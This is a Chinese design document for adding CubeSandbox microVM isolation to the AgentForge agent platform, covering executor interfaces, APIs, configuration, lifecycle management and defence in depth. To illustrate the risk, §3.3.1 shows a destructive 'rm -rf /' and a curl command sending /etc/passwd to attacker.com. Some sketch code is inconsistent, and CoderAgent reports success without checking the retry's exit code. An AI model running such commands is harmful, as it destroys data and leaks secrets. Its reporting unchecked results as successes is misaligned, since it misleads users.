# AgentForge × CubeSandbox 集成设计方案

## 1. 背景与目标

### 1.1 现状问题

AgentForge 当前设计中，`code_executor` Skill 使用 Docker 容器执行代码。Docker 的优势是轻量、启动快（~200ms），但存在两个固有限制：

1. **隔离级别不足**：Docker 共享宿主机内核，仅靠 Namespace/Cgroup 隔离。对于不可信用户代码（尤其是 LLM 生成的代码），存在容器逃逸风险。
2. **高密度限制**：单台机器上 Docker 容器数量受限于资源调度复杂度，难以达到数千级并发。

### 1.2 CubeSandbox 能力

CubeSandbox 提供：

- **< 60ms 冷启动**：基于快照克隆 + CoW 内存复用
- **硬件级隔离**：每个沙箱独立 Guest OS 内核（KVM MicroVM）
- **单机数千实例**：单沙箱内存开销 < 5MB
- **E2B SDK 完全兼容**：替换环境变量即可从 E2B 云服务切换到自部署

### 1.3 集成目标

将 CubeSandbox 作为 AgentForge 的 **"高隔离执行沙箱" 可选后端**，与现有 Docker 沙箱并存，形成分级隔离策略：

| 执行场景 | 隔离方案 | 原因 |
|----------|---------|------|
| 可信代码执行（用户自己的项目代码） | Docker 容器（现有） | 速度快，隔离足够 |
| 不可信代码执行（LLM 生成的代码、外部 Skill） | CubeSandbox | 内核级隔离，防逃逸 |
| 并发测试 / 回归测试 | CubeSandbox | 高并发支持，快照回滚 |
| 浏览器自动化（Playwright 等） | CubeSandbox | 需要完整 OS 环境 |

---

## 2. 架构设计

### 2.1 集成位置

```
┌──────────────────────────────────────────────────────────────┐
│                    AgentForge API Layer                       │
│              POST /api/v1/tasks /tasks/stream                │
└──────────────────────────────────────────────────────────────┘
                              │
┌──────────────────────────────────────────────────────────────┐
│                   Task Orchestrator                           │
│           任务分解 → Agent 协商 → Skill 调用                   │
└──────────────────────────────────────────────────────────────┘
                              │
                    ┌─────────┴──────────┐
                    ▼                    ▼
┌──────────────────────┐    ┌──────────────────────────────────┐
│  Executor (当前设计)  │    │ Sandbox Manager (新增)           │
│                      │    │                                  │
│  SkillExecutor       │    │  SandboxFactory (抽象)           │
│  - 执行 Skill        │    │   ├── DockerSandboxFactory       │
│  - 可选走沙箱        │    │   └── CubeSandboxFactory         │
└──────────────────────┘    │   │  sandbox_id 生命周期管理     │
                            │   │  TTL 超时 & 自动回收         │
                            │   │  连接池（预置热沙箱）          │
                            └──────────────────────────────────┘
```

### 2.2 沙箱抽象层

定义统一的 `SandboxExecutor` 协议，对上层（Agent / Skill）完全透明：

```python
from __future__ import annotations
from dataclasses import dataclass, field
from enum import Enum
from typing import Protocol

class SandboxState(str, Enum):
    PENDING = "pending"
    RUNNING = "running"
    PAUSED = "paused"
    DESTROYED = "destroyed"
    TIMEOUT = "timeout"

@dataclass
class SandboxConfig:
    """沙箱创建配置"""
    template_id: str
    timeout_seconds: int = 300          # TTL 默认 5 分钟
    network_public: bool = True         # 是否允许公网访问
    memory_mb: int = 512                # 建议内存（CubeSandbox 按需分配）
    writable_layer_gb: int = 1          # 可写层大小
    exposed_ports: list[int] = field(default_factory=lambda: [49999, 49983])

@dataclass
class ExecResult:
    """代码执行结果"""
    stdout: str
    stderr: str
    exit_code: int
    duration_ms: int

@dataclass
class ConnectInfo:
    """沙箱连接信息"""
    sandbox_id: str
    host: str                           # 沙箱内部 IP（纯 hostname/IP，不含端口）
    port: int                           # 沙箱对外暴露端口（独立字段，不与 host 合并为 host:port）
    template_id: str
    state: SandboxState = SandboxState.RUNNING
    timeout_at: int = 0                 # Unix 时间戳，超时时刻

class SandboxExecutor(Protocol):
    """沙箱执行器统一接口"""

    async def create(self, config: SandboxConfig) -> ConnectInfo:
        """创建沙箱，返回连接信息"""
        ...

    async def execute(self, sandbox_id: str, code: str,
                      timeout: int = 30) -> ExecResult:
        """在沙箱中执行代码"""
        ...

    async def execute_shell(self, sandbox_id: str, command: str,
                            timeout: int = 30) -> ExecResult:
        """在沙箱中执行 Shell 命令"""
        ...

    async def files_read(self, sandbox_id: str, path: str) -> str:
        """读取沙箱文件内容"""
        ...

    async def files_write(self, sandbox_id: str, path: str,
                          content: str) -> None:
        """写入文件到沙箱"""
        ...

    async def connect(self, sandbox_id: str,
                      timeout: int = 0) -> ConnectInfo:
        """获取/续期已有沙箱的连接信息"""
        ...

    async def get_logs(self, sandbox_id: str) -> str:
        """获取沙箱日志"""
        ...

    async def pause(self, sandbox_id: str) -> None:
        """暂停沙箱（不销毁，释放计算资源）"""
        ...

    async def resume(self, sandbox_id: str,
                     timeout: int = 0) -> ConnectInfo:
        """恢复已暂停的沙箱"""
        ...

    async def destroy(self, sandbox_id: str) -> None:
        """彻底销毁沙箱，释放所有资源"""
        ...
```

### 2.3 工厂模式

```python
class SandboxFactory(Protocol):
    """沙箱工厂：创建对应类型的执行器"""

    async def create(self) -> SandboxExecutor:
        ...

class SandboxManager:
    """沙箱管理器：统一生命周期 + TTL 回收

    注意：executor 由外部通过工厂创建后注入，SandboxManager 只负责
    sandbox_id 的生命周期管理（创建、续期、TTL 超时销毁），不负责
    创建 executor 实例本身。
    """

    def __init__(self, executor: SandboxExecutor, ttl_seconds: int = 300):
        # executor 在构造时注入，保证永远不为 None
        # 调用方示例：
        #   executor = await CubeSandboxFactory(...).create()
        #   manager  = SandboxManager(executor, ttl_seconds=300)
        self._executor: SandboxExecutor = executor
        self._ttl = ttl_seconds
        self._sandbox_id: str | None = None
        self._last_access: float = 0.0
        self._destroyed = False

    async def get_or_create(self) -> str:
        """返回可用的 sandbox_id，必要时创建新沙箱或续期现有沙箱。

        Returns:
            sandbox_id: 当前可用沙箱的 ID
        """
        if self._destroyed:
            raise SandboxDestroyedError("沙箱已销毁，请重新创建 SandboxManager")

        now = time.time()

        if self._sandbox_id is None:
            # 首次使用：创建新沙箱
            config = SandboxConfig(timeout_seconds=self._ttl)
            info = await self._executor.create(config)
            self._sandbox_id = info.sandbox_id
            self._last_access = now
        else:
            elapsed = now - self._last_access
            if elapsed > self._ttl:
                # TTL 超时：销毁旧沙箱，创建新沙箱
                await self._executor.destroy(self._sandbox_id)
                config = SandboxConfig(timeout_seconds=self._ttl)
                info = await self._executor.create(config)
                self._sandbox_id = info.sandbox_id
            else:
                # 续期：通知 CubeSandbox 重置 TTL 计时器
                await self._executor.connect(self._sandbox_id, timeout=0)
            self._last_access = now

        return self._sandbox_id

    async def execute(self, code: str, timeout: int = 30) -> ExecResult:
        """在当前沙箱中执行代码（自动处理沙箱生命周期）"""
        sandbox_id = await self.get_or_create()
        return await self._executor.execute(sandbox_id, code, timeout=timeout)

    async def destroy(self) -> None:
        """彻底销毁当前沙箱并标记 manager 为不可用"""
        if self._sandbox_id and not self._destroyed:
            await self._executor.destroy(self._sandbox_id)
        self._sandbox_id = None
        self._destroyed = True
```

---

## 3. CubeSandbox 实现

### 3.1 两种对接路径

AgentForge 支持两种对接 CubeSandbox 的方式，根据部署环境选择：

#### 路径 A：使用 E2B Python SDK（推荐）

CubeSandbox 完全兼容 E2B SDK，直接使用 `e2b-code-interpreter` 或 `e2b` 包：

```python
# requirements.txt
e2b-code-interpreter>=1.0.0

# agent_forge/sandbox/cubesandbox_e2b.py
import os
import asyncio
from dataclasses import dataclass
from typing import Optional

from e2b_code_interpreter import Sandbox as E2BSandbox

# 专用线程池：避免与 FastAPI 默认线程池争抢资源
# E2B SDK 当前版本（<1.x）的核心方法是同步阻塞的，需通过线程池桥接 asyncio。
# 若 SDK 升级到提供 AsyncSandbox，可直接 await，移除此线程池。
_SANDBOX_THREAD_POOL = ThreadPoolExecutor(max_workers=20, thread_name_prefix="cube-sandbox")


class CubeSandboxE2BExecutor:
    """基于 E2B SDK 的 CubeSandbox 执行器。

    兼容性说明：
    - e2b-code-interpreter >= 0.x（同步 SDK）：使用 _SANDBOX_THREAD_POOL 桥接
    - e2b-code-interpreter >= 1.x（若提供 AsyncSandbox）：可改为直接 await，
      届时移除 run_in_executor 调用和 _SANDBOX_THREAD_POOL。
    """

    def __init__(self, api_url: str | None = None, api_key: str | None = None,
                 template_id: str | None = None):
        self._api_url = api_url or os.environ.get("CUBE_SANDBOX_URL",
                                                   "http://127.0.0.1:3000")
        self._api_key = api_key or os.environ.get("CUBE_SANDBOX_API_KEY", "")
        self._template_id = template_id or os.environ.get(
            "CUBE_TEMPLATE_ID", "")

        # 指向自部署 CubeSandbox，禁用 E2B 默认云域名
        os.environ["E2B_DOMAIN"] = ""  # 禁用默认域名
        os.environ["E2B_DATA_PLANE_URL"] = self._api_url

    async def create(self, config: SandboxConfig) -> ConnectInfo:
        loop = asyncio.get_event_loop()
        sandbox = await loop.run_in_executor(
            _SANDBOX_THREAD_POOL,
            lambda: E2BSandbox.create(
                template=config.template_id or self._template_id,
                api_key=self._api_key,
            )
        )
        return ConnectInfo(
            sandbox_id=sandbox.sandbox_id,
            host=sandbox.get_host(),   # 纯 hostname/IP
            port=config.exposed_ports[0] if config.exposed_ports else 49999,
            template_id=config.template_id or self._template_id,
        )

    async def execute(self, sandbox_id: str, code: str,
                      timeout: int = 30) -> ExecResult:
        loop = asyncio.get_event_loop()

        def _exec():
            sbx = E2BSandbox.attach(sandbox_id, api_key=self._api_key)
            return sbx.run_code(code, timeout=timeout)

        result = await loop.run_in_executor(_SANDBOX_THREAD_POOL, _exec)
        return ExecResult(
            stdout="".join(r.text for r in result.results if hasattr(r, 'text')),
            stderr=result.error.traceback if result.error else "",
            exit_code=0 if result.error is None else 1,
            duration_ms=int(result.duration * 1000) if result.duration else 0,
        )
```

**优点**：API 简洁，生态成熟，SDK 自动处理连接/认证。
**缺点**：需要在同一台 / 网络可达的服务器上运行 CubeSandbox 后端。

#### 路径 B：直接使用 REST API

当需要更精细控制（如自定义快照、集群调度）时，直接调用 CubeSandbox REST API：

```python
# agent_forge/sandbox/cubesandbox_api.py
import httpx
from typing import Optional

class CubeSandboxAPIExecutor:
    """基于 REST API 的 CubeSandbox 执行器"""

    def __init__(self, base_url: str, api_key: str):
        self._base_url = base_url.rstrip("/")
        self._api_key = api_key
        self._client = httpx.AsyncClient(
            base_url=self._base_url,
            headers={"Authorization": f"Bearer {api_key}"},
            timeout=httpx.Timeout(30.0, connect=5.0),
        )

    async def create(self, config: SandboxConfig) -> ConnectInfo:
        resp = await self._client.post("/sandboxes", json={
            "templateID": config.template_id,
            "timeout": config.timeout_seconds,
        })
        resp.raise_for_status()
        data = resp.json()
        return ConnectInfo(
            sandbox_id=data["sandboxID"],
            host="127.0.0.1",
            port=49999,  # 从返回的暴露端口中选取
            template_id=config.template_id,
        )

    async def execute(self, sandbox_id: str, code: str,
                      timeout: int = 30) -> ExecResult:
        # 通过 envd API 执行代码
        resp = await self._client.post(
            f"/sandboxes/{sandbox_id}/code",
            json={"code": code, "timeout": timeout},
        )
        resp.raise_for_status()
        data = resp.json()
        return ExecResult(
            stdout=data.get("stdout", ""),
            stderr=data.get("stderr", ""),
            exit_code=data.get("exitCode", 0),
            duration_ms=data.get("durationMs", 0),
        )

    async def destroy(self, sandbox_id: str) -> None:
        await self._client.delete(f"/sandboxes/{sandbox_id}")

    async def close(self) -> None:
        await self._client.aclose()
```

### 3.2 配置映射

E2B SDK ↔ CubeSandbox REST API 的字段映射：

| AgentForge 配置 | E2B SDK 参数 | CubeSandbox API 字段 |
|-----------------|-------------|---------------------|
| `template_id` | `template` | `templateID` |
| `timeout_seconds` | (SDK 内部管理) | `timeout` |
| `network_public` | (默认) | (CubeVS 策略) |
| `writable_layer_gb` | (模板构建时指定) | (构建时指定) |

> **关键提示**：`writable_layer_size` 在模板构建时指定，运行时不可更改。AgentForge 在部署时配置默认值即可。

---

## 3.3 沙箱隔离设计规则

> **本节回答核心问题：沙箱隔离到底是什么？怎么算安全？隔离什么？**

### 3.3.1 隔离的本质：隔离"执行"而非"数据"

沙箱隔离的不是用户的数据（用户代码库存在 PostgreSQL 里，与沙箱无关），而是**隔离代码的执行环境**：

```
❌ 没有隔离：LLM 生成的代码直接跑在 AgentForge 服务器上

  LLM 生成的代码:
  import os
  os.system("rm -rf /")       # 服务器直接炸了

  恶意用户:
  import os
  os.system("curl http://attacker.com -d @/etc/passwd")  # 数据泄露
```

```
✅ 有沙箱：代码跑在隔离环境里

  +-----------------------------------+
  |  沙箱（独立的 VM 或容器）           |
  |  rm -rf /  → 只删掉这个沙箱里的文件 |
  +-----------------------------------+
  |  AgentForge 服务器（不受影响）      |
  +-----------------------------------+
```

### 3.3.2 三种隔离级别对比

#### 级别 1：进程内执行（❌ 不安全）

```
LLM 生成的代码 ──→ 直接在 AgentForge 进程里跑
```

任何代码都能读写服务器上的数据库、JWT key、用户代码库。

#### 级别 2：Docker 容器隔离（Namespace + Cgroup）

```
+-----------------------------------------------+
|  AgentForge 服务器（共享内核）                   |
|                                               |
|  +--------+  +--------+  +--------+           |
|  | 容器 1 |  | 容器 2 |  | 容器 3 |           |
|  | (PID)  |  | (PID)  |  | (PID)  |           |
|  | (FS)   |  | (FS)   |  | (FS)   |           |
|  | (NET)  |  | (NET)  |  | (NET)  |           |
|  +--------+  +--------+  +--------+           |
|        ↑ 共享同一个 Linux 内核                  |
+-----------------------------------------------+
```

**能防什么**：一般用户代码不会互相干扰。

**防不住什么**：
- `mount` / `ptrace` / 内核漏洞 → **容器逃逸**，拿到宿主机权限
- 恶意用户利用 Kernel CVE（比如脏牛、eBPF 漏洞）→ 直接从容器跳到宿主机

#### 级别 3：CubeSandbox 内核级隔离（✅ 最强）

```
+--------------------------------------------------+
|  宿主机                                           |
|  +----------+  +----------+  +----------+        |
|  | VM 沙箱1 |  | VM 沙箱2 |  | VM 沙箱N |        |
|  | Linux内核 |  | Linux内核 |  | Linux内核 |        |
|  | (独立)    |  | (独立)    |  | (独立)    |        |
|  +----------+  +----------+  +----------+        |
|        ↑ 每个沙箱有自己完整的操作系统内核            |
+--------------------------------------------------+
```

**能防住什么**：不管容器里怎么折腾内核漏洞，影响范围只在**那个沙箱自己**，碰不到宿主机。就像病毒传染，一个房间的人得病不会让隔壁房间的人得病，因为墙是隔到地的。

### 3.3.3 AgentForge 中的实际意义

用户场景是：让 Agent 帮他写代码、跑测试、调试 Bug。

其中**有一段是 Agent 自己生成的代码需要被执行**：

```
用户：帮我重构这个模块，然后跑一下测试看看
  → Agent 生成重构代码
  → Agent 生成测试脚本
  → 这些代码需要被执行来验证结果
  → 如果代码里有恶意的东西（LLM 可能胡说八道，或者用户故意埋了恶意代码）
```

| 隔离方案 | Agent 跑测试 | 用户故意塞恶意代码 | LLM 生成的离谱代码 |
|----------|------------|------------------|------------------|
| 不隔离 | 能跑，但炸了服务器 | **服务器被黑** | 可能删数据 |
| Docker | 能跑，容器隔离 | 基本安全，但存在逃逸风险 | 不会伤到宿主机 |
| CubeSandbox | 能跑，VM 隔离 | **不可能逃逸** | 只在 VM 里蹦跶 |

### 3.3.4 安全是纵深防御

单独任何一层都不够，三层合在一起才算"安全"：

```
┌────────────────────────────────────────────────────┐
│               AgentForge 应用层                     │
│  ① Prompt 注入检测（§3）                           │
│  ② tool_call 风险分级（§3.4）                       │
│  ③ 代码/命令内容安全扫描                             │
└──────────────────────┬─────────────────────────────┘
                       │
┌──────────────────────▼─────────────────────────────┐
│            CubeSandbox 执行层                        │
│  ④ KVM 硬件级隔离（每个沙箱独立内核）                │
│  ⑤ CubeVS eBPF 网络隔离（出站过滤）                │
│  ⑥ 文件系统等权限控制                                │
│  ⑦ 资源限制（CPU/内存，由模板规格约束）              │
└────────────────────────────────────────────────────┘
```

第 1-3 层防止 LLM 被污染、防止高风险操作未经授权执行、防止恶意代码通过内容注入；
第 4-7 层防止已执行的代码伤到宿主机。

### 3.3.5 沙箱分级策略

不是所有场景都需要内核级隔离，根据风险等级选用不同方案：

| 执行场景 | 隔离方案 | 原因 |
|----------|---------|------|
| 可信代码（用户自己的项目代码） | Docker 容器（现有） | 速度快，隔离足够 |
| 不可信代码（LLM 生成的代码、外部 Skill） | CubeSandbox | 内核级隔离，防逃逸 |
| 并发测试 / 回归测试 | CubeSandbox | 高并发支持，快照回滚 |
| 浏览器自动化（Playwright 等） | CubeSandbox | 需要完整 OS 环境 |

### 3.3.6 沙箱 vs 弹窗确认：两类安全机制

用户常混淆"沙箱隔离"和"弹窗确认（Guard Action）"，它们是完全不同的两层安全机制：

| 对比维度 | 沙箱隔离（CubeSandbox） | 弹窗确认（Guard Action） |
|----------|----------------------|----------------------|
| **防什么** | 防**代码执行**时炸掉服务器 | 防**用户误确认**危险数据库操作 |
| **怎么防** | 关在独立 VM 里，内核级隔离 | 弹窗问一句"确定吗" |
| **适用场景** | LLM 生成的代码要跑 | Agent 要改数据库 / 删表 |
| **AgentForge 位置** | §3.3 本节 | §3.4 tool_call 风险分级 |
| **关系** | 完全独立 | 完全独立 |

两者会配合出现的场景：

```
用户：帮我重构代码 + 更新数据库

  Agent 的工作流程:
  ├── 生成重构代码
  │     └── 放进 CubeSandbox 跑测试 → 沙箱隔离（§3.3）
  │
  └── 生成 SQL 更新数据库
        └── tool_call 风险分级 → HIGH → 弹窗确认（§3.4）→ 用户点确认
```

---

## 4. API 设计

### 4.1 新增 API 端点

在 `POST /api/v1/tasks` 的请求体中增加 `sandbox` 字段：

```http
POST /api/v1/tasks
Authorization: Bearer <token>
Content-Type: application/json

{
  "description": "审查这个 PR 的代码质量并运行测试",
  "priority": "high",
  "sandbox": {
    "provider": "cubesandbox",     // 可选: "docker" | "cubesandbox" | "auto"
    "template_id": "tpl-xxxxx",    // 使用 CubeSandbox 时必填
    "timeout_seconds": 300
  }
}
```

**响应**（增加沙箱信息）：

```json
{
  "task_id": "task-001",
  "status": "processing",
  "sandbox": {
    "provider": "cubesandbox",
    "sandbox_id": "sb-abc123",
    "template_id": "tpl-xxxxx",
    "connected_at": "2026-06-25T10:00:00Z"
  },
  "trace_id": "trace-001",
  "created_at": "2026-06-25T10:00:00Z"
}
```

### 4.2 沙箱管理 API

```http
POST /api/v1/sandboxes/create
Authorization: Bearer <token>

{
  "template_id": "tpl-xxxxx",
  "timeout_seconds": 600,
  "network_public": true
}

// 响应 201
{
  "sandbox_id": "sb-abc123",
  "template_id": "tpl-xxxxx",
  "host": "127.0.0.1",
  "port": 49999,
  "state": "running",
  "timeout_at": "2026-06-25T10:10:00Z"
}
```

```http
POST /api/v1/sandboxes/{sandbox_id}/execute
Authorization: Bearer <token>

{
  "code": "print('hello')",
  "language": "python",
  "timeout_seconds": 30
}

// 响应 200
{
  "sandbox_id": "sb-abc123",
  "stdout": "hello",
  "stderr": "",
  "exit_code": 0,
  "duration_ms": 1523
}
```

```http
POST /api/v1/sandboxes/{sandbox_id}/files/read
Authorization: Bearer <token>

{
  "path": "/tmp/result.json"
}

// 响应 200
{
  "sandbox_id": "sb-abc123",
  "path": "/tmp/result.json",
  "content": "{'score': 85}"
}
```

```http
POST /api/v1/sandboxes/{sandbox_id}/files/write
Authorization: Bearer <token>

{
  "path": "/tmp/output.py",
  "content": "print('test')"
}
```

```http
POST /api/v1/sandboxes/{sandbox_id}/pause
Authorization: Bearer <token>
```

```http
POST /api/v1/sandboxes/{sandbox_id}/resume
Authorization: Bearer <token>

{
  "timeout_seconds": 300
}
```

```http
POST /api/v1/sandboxes/{sandbox_id}/destroy
Authorization: Bearer <token>
```

```http
GET /api/v1/sandboxes
Authorization: Bearer <token>

// 响应 200
{
  "total": 5,
  "items": [
    {
      "sandbox_id": "sb-abc123",
      "template_id": "tpl-xxxxx",
      "state": "running",
      "created_at": "2026-06-25T10:00:00Z",
      "timeout_at": "2026-06-25T10:10:00Z",
      "connected_at": "2026-06-25T10:00:05Z"
    }
  ]
}
```

### 4.3 SSE 事件扩展

增加沙箱生命周期事件：

| 事件 | 说明 | data 字段 |
|------|------|----------|
| `sandbox_created` | 沙箱创建成功 | `{ sandbox_id, template_id, provider }` |
| `sandbox_connected` | 沙箱连接就绪 | `{ sandbox_id, host, port }` |
| `sandbox_code_executing` | 代码执行中 | `{ sandbox_id, code_hash, timeout }` |
| `sandbox_code_completed` | 代码执行完成 | `{ sandbox_id, exit_code, duration_ms }` |
| `sandbox_paused` | 沙箱已暂停 | `{ sandbox_id }` |
| `sandbox_resumed` | 沙箱已恢复 | `{ sandbox_id, timeout_at }` |
| `sandbox_destroyed` | 沙箱已销毁 | `{ sandbox_id }` |
| `sandbox_timeout` | 沙箱 TTL 超时 | `{ sandbox_id, timeout_at }` |

在现有事件流中追加这些事件，前端可过滤显示。

---

## 5. 配置设计

### 5.1 环境变量

```bash
# ─── CubeSandbox 连接配置 ───
# 是否启用 CubeSandbox（默认 false）
CUBE_SANDBOX_ENABLED=true

# CubeSandbox API 地址
CUBE_SANDBOX_URL=http://127.0.0.1:3000

# CubeSandbox API Key
CUBE_SANDBOX_API_KEY=e2b_000000

# 默认模板 ID（可选，也可在每次请求中指定）
CUBE_TEMPLATE_ID=tpl-xxxxx

# 沙箱默认 TTL 秒数
CUBE_SANDBOX_TIMEOUT=300

# 应用启动时是否预热远程沙箱池；本地开发默认 false，生产需要时显式开启
SANDBOX_POOL_PREWARM_ENABLED=false

# 开启预热后的热沙箱数量
SANDBOX_POOL_MIN_SIZE=5

# ─── 沙箱选择策略 ───
# 默认沙箱提供商：docker | cubesandbox | auto
CUBE_SANDBOX_DEFAULT_PROVIDER=cubesandbox

# auto 模式：code_executor 走 cubesandbox，其他走 docker
CUBE_SANDBOX_AUTO_MODE=true
```

### 5.2 Config 模型

```python
# src/agent_forge/config.py

class CubeSandboxConfig(BaseModel):
    enabled: bool = False
    url: str = "http://127.0.0.1:3000"
    api_key: str = ""
    template_id: str = ""
    timeout_seconds: int = 300
    default_provider: str = "docker"    # docker | cubesandbox | auto
    auto_mode: bool = True

    @model_validator(mode="before")
    @classmethod
    def from_env(cls, values: Any) -> Any:
        if isinstance(values, dict):
            return values
        return {
            "enabled": os.getenv("CUBE_SANDBOX_ENABLED", "false").lower() == "true",
            "url": os.getenv("CUBE_SANDBOX_URL", "http://127.0.0.1:3000"),
            "api_key": os.getenv("CUBE_SANDBOX_API_KEY", ""),
            "template_id": os.getenv("CUBE_TEMPLATE_ID", ""),
            "timeout_seconds": int(os.getenv("CUBE_SANDBOX_TIMEOUT", "300")),
            "default_provider": os.getenv("CUBE_SANDBOX_DEFAULT_PROVIDER", "docker"),
            "auto_mode": os.getenv("CUBE_SANDBOX_AUTO_MODE", "true").lower() == "true",
        }

class Settings(BaseSettings):
    # ... 现有配置 ...
    cube_sandbox: CubeSandboxConfig = Field(default_factory=CubeSandboxConfig)
```

---

## 6. Agent / Skill 集成

### 6.1 Coder Agent 改造

Coder Agent 在生成代码后，需要执行测试时走沙箱：

```python
# src/agent_forge/agents/coder.py

class CoderAgent(Agent):
    async def execute(self, sub_task: SubTask) -> AgentResult:
        # 1. LLM 生成代码
        code = await self._generate_code(sub_task.description)

        # 2. 根据配置选择沙箱
        provider = self._select_sandbox_provider(sub_task)

        # 3. 创建沙箱并执行
        async with self._sandbox_manager.get_executor() as executor:
            result = await executor.execute(code, timeout=60)

            # 4. 获取执行结果
            if result.exit_code == 0:
                return AgentResult(
                    status="completed",
                    content=f"代码执行成功\n\n{result.stdout}",
                    artifacts=[{"type": "stdout", "content": result.stdout}],
                )
            else:
                # 5. 根据错误信息让 LLM 自动修复
                fix_prompt = f"代码执行失败:\nstderr: {result.stderr}\n\n请修复代码"
                fixed_code = await self._generate_code(fix_prompt)
                result = await executor.execute(fixed_code, timeout=60)
                return AgentResult(
                    status="completed",
                    content=f"修复后代码执行成功\n\n{result.stdout}",
                )
```

### 6.2 Skill Executor 集成

```python
# src/agent_forge/skills/code_executor.py

async def execute(code: str, config: SkillConfig) -> dict:
    """code_executor Skill 的入口"""

    # 读取全局配置
    settings = get_settings()
    provider = config.get("provider") or settings.cube_sandbox.default_provider

    if provider == "cubesandbox" and settings.cube_sandbox.enabled:
        # 走 CubeSandbox
        factory = CubeSandboxFactory(
            url=settings.cube_sandbox.url,
            api_key=settings.cube_sandbox.api_key,
            template_id=settings.cube_sandbox.template_id,
        )
    else:
        # 走 Docker（现有逻辑）
        factory = DockerSandboxFactory()

    manager = SandboxManager(factory, ttl=settings.cube_sandbox.timeout_seconds)
    executor = await manager.get_executor()
    result = await executor.execute(code, timeout=config.get("timeout", 30))

    # 清理
    await manager.destroy()

    return {
        "stdout": result.stdout,
        "stderr": result.stderr,
        "exit_code": result.exit_code,
        "duration_ms": result.duration_ms,
    }
```

### 6.3 自动选择策略

```python
def _select_sandbox_provider(self, sub_task: SubTask) -> str:
    """根据子任务类型选择沙箱提供商"""
    settings = get_settings()

    if not settings.cube_sandbox.enabled:
        return "docker"

    if settings.cube_sandbox.auto_mode:
        # auto 模式：code_executor 和 shell 操作走 cubesandbox
        if sub_task.type in ("code_execution", "shell", "testing"):
            return "cubesandbox"
        return "docker"

    return settings.cube_sandbox.default_provider
```

---

## 7. 生命周期管理

### 7.1 沙箱 TTL 与自动回收

```
沙箱创建 → 连接 → 使用 → 空闲 → TTL 超时 → 暂停 → 再超时 → 销毁
           │                                      │            │
           └── 续期 (connect with timeout) ────────┘            └── 清理资源
```

```python
class SandboxReclaimer:
    """后台定时任务：扫描并回收过期沙箱"""

    def __init__(self, executor_factory: SandboxFactory, check_interval: int = 60):
        self._factory = executor_factory
        self._check_interval = check_interval
        self._running = False

    async def start(self):
        self._running = True
        while self._running:
            await self._reclaim_expired()
            await asyncio.sleep(self._check_interval)

    async def _reclaim_expired(self):
        """扫描所有沙箱，按阶段回收"""
        sandboxes = await self._list_active_sandboxes()
        now = time.time()

        for sb in sandboxes:
            timeout_at = sb.get("timeout_at", 0)
            if not timeout_at:
                continue

            if now > timeout_at:
                # TTL 过期 → 先暂停（不立即销毁，允许恢复）
                await self._factory.create().pause(sb["sandbox_id"])
                sb["paused_at"] = now
                await self._update_sandbox(sb)
            else:
                paused_at = sb.get("paused_at", 0)
                if paused_at and (now - paused_at) > PAUSE_TTL:
                    # 暂停超期 → 彻底销毁
                    await self._factory.create().destroy(sb["sandbox_id"])
                    await self._remove_sandbox(sb["sandbox_id"])
```

### 7.2 资源池化（已实现）

为极致降低冷启动延迟，可维护一个"热沙箱池"。TASK-020 后，热池预热不再是应用启动默认行为；需要生产预热时显式设置 `SANDBOX_POOL_PREWARM_ENABLED=true`：

```python
class SandboxPool:
    """预置热沙箱池 — 需要 CubeSandbox 集群支持

    用法示例：
        executor = CubeSandboxAPIExecutor(base_url=..., api_key=...)
        config   = SandboxConfig(template_id="tpl-python", timeout_seconds=300)
        pool     = SandboxPool(executor=executor, config=config, min_size=5, max_size=50)
        await pool.bootstrap()          # 应用启动时预热

        info = await pool.acquire()     # 获取热沙箱
        ...                             # 使用沙箱
        await pool.release(info)        # 归还（或销毁）
    """

    def __init__(
        self,
        executor: SandboxExecutor,
        config: SandboxConfig,
        min_size: int = 5,
        max_size: int = 50,
    ):
        self._executor = executor
        self._config = config
        self._pool: asyncio.Queue[ConnectInfo] = asyncio.Queue(maxsize=max_size)
        self._min_size = min_size

    async def bootstrap(self) -> None:
        """预热：预创建 min_size 个沙箱，应在应用启动时调用一次"""
        for _ in range(self._min_size):
            info = await self._executor.create(self._config)
            await self._pool.put(info)

    async def acquire(self) -> ConnectInfo:
        """从池中获取一个沙箱；池空时冷启动新沙箱（等待 ~60ms）"""
        try:
            return self._pool.get_nowait()
        except asyncio.QueueEmpty:
            # 池空了 → 临时冷启动
            return await self._executor.create(self._config)

    async def release(self, info: ConnectInfo) -> None:
        """归还沙箱到池中；池满时直接销毁"""
        try:
            self._pool.put_nowait(info)
        except asyncio.QueueFull:
            await self._executor.destroy(info.sandbox_id)
```

---

## 8. 安全性设计

### 8.1 与现有安全体系的叠加

CubeSandbox 提供**执行层隔离**（内核级），AgentForge 现有安全设计提供**应用层防护**，两者形成纵深防御：

```
┌────────────────────────────────────────────────────┐
│               AgentForge 应用层                     │
│  ① Prompt 注入检测（§3）                           │
│  ② tool_call 风险分级（§3.4）                       │
│  ③ 代码/命令内容安全扫描                             │
└──────────────────────┬─────────────────────────────┘
                       │
┌──────────────────────▼─────────────────────────────┐
│            CubeSandbox 执行层                        │
│  ④ KVM 硬件级隔离（每个沙箱独立内核）                │
│  ⑤ CubeVS eBPF 网络隔离（出站过滤）                │
│  ⑥ 文件系统等权限控制                                │
│  ⑦ 资源限制（CPU/内存，由模板规格约束）              │
└────────────────────────────────────────────────────┘
```

### 8.2 关键安全措施

| 措施 | 说明 |
|------|------|
| **API Key 隔离** | 每个用户（或每租户）独立 API Key，防止跨租户沙箱访问 |
| **模板白名单** | 仅允许使用预审核的模板，禁止用户自定义模板直接执行 |
| **网络出站过滤** | 通过 CubeVS 策略控制沙箱出站流量（可关闭公网） |
| **快照回滚审计** | 所有快照创建、回滚操作记录审计日志 |
| **沙箱销毁保障** | 任务完成后立即销毁沙箱，TTL 作为兜底 |
| **不信任模板** | 模板本身视为不可信，不应包含特权操作 |

### 8.3 新增安全事件

在 §12.3 审计日志中新增：

| 事件 | 级别 | 触发条件 |
|------|------|---------|
| `sandbox_created` | INFO | 沙箱创建成功 |
| `sandbox_destroyed` | INFO | 沙箱销毁 |
| `sandbox_timeout` | WARN | 沙箱 TTL 超时自动暂停 |
| `sandbox_reclaim` | INFO | 后台回收器销毁过期沙箱 |
| `sandbox_code_exec_failed` | WARN | 沙箱代码执行失败（exit_code != 0） |

---

## 9. 部署方案

### 9.1 架构关系

```
┌─────────────────────────────────────────────────────────────┐
│                        同一台 / 同 VPC 主机                   │
│                                                             │
│  ┌──────────────┐    ┌──────────────────────────────────┐   │
│  │  AgentForge   │    │      CubeSandbox 集群             │   │
│  │              │    │                                   │   │
│  │  FastAPI     │◄──►│  CubeAPI (E2B REST, :3000)       │   │
│  │  ( :8000 )   │ REST │  CubeMaster  (调度)             │   │
│  │              │ JSON │  Cubelet     (节点)             │   │
